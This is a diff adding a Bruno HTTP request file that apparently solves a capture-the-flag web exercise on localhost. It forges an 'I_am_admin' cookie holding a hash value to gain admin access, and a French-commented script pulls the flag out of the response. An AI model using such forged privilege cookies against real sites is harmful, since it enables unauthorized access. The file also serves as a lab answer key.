@@ -1,0 +1,39 @@
+meta {
+  name: 01-CookieManipulation
+  type: http
+  seq: 2
+}
+
+get {
+  url: http://localhost:8000
+  body: none
+  auth: none
+}
+
+headers {
+  Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09
+}
+
+script:post-response {
+  // Récupérer le corps de la réponse
+  const responseBody = res.body;
+  
+  // Vérifier si le corps de la réponse est une chaîne de caractères
+  if (typeof responseBody === 'string') {
+      // Utiliser une expression régulière pour extraire le texte après 'Good job! Flag :'
+      const regex = /Good job! Flag : ([^']+)/i;
+      const match = responseBody.match(regex);
+  
+      if (match) {
+          const extractedFlag = match[1];
+          console.log("Flag extrait :", extractedFlag);
+  
+          bru.setEnvVar("extractedFlag", extractedFlag);
+      } else {
+          console.log("Aucun flag trouvé dans la réponse.");
+      }
+  } else {
+      console.log("Le corps de la réponse n'est pas une chaîne de caractères.");
+  }
+  
+}
